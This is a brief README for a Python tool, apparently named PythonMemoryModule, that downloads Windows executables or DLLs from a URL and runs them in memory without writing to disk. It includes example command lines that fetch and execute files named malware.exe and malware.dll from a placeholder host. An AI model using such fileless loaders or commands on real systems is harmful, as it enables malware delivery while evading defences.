Greetings
# PythonMemoryModule
execute any PE (dll,exe) in memory filelessly


# usage

pyMemory.py < url> < TYPe >

# build into exe

use pyinstaller or nuitka and build pymemory.py

or use the prebuilt exe in ./output 

# example

exe : PyexecMemory.exe http://example.com/malware.exe EXE 

dll: PyexecMemory.exe http://example.com/malware.dll DLL --Method DLLRegisterServer

# Check form more info

https://github.com/naksyn/PythonMemoryModule

https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/